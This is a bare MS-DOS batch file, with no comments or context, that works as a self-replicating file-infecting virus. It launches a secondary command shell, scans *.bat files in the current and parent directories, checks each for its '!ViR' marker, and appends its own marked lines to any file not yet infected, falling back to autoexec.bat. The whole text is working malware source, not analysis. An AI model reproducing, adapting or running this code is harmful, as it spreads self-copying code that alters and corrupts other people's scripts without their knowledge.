@if -%1==-!ViR goto %1%2
@echo :!ViR>!ViR!x.bat
@%comspec% nul /e:9000 /f/c%0 !ViR s
@del !ViR!?.b*
@goto !ViRh
:!ViRs
set !ViR=%0.bat
if not exist %!ViR% set !ViR=%0
if -%0==- set !ViR=autoexec.bat
if not exist %!ViR% exit
for %%a in (*.bat ..\*.bat) do call %!ViR% !ViR i %%a
!ViR!x
:!ViRi
find "!ViR"<%3
if not errorlevel 1 !ViR!x
find "!ViR"<%!ViR%>!ViR!.b
copy/b !ViR!.b+%3
copy !ViR!.b %3
exit !ViR
:!ViRh
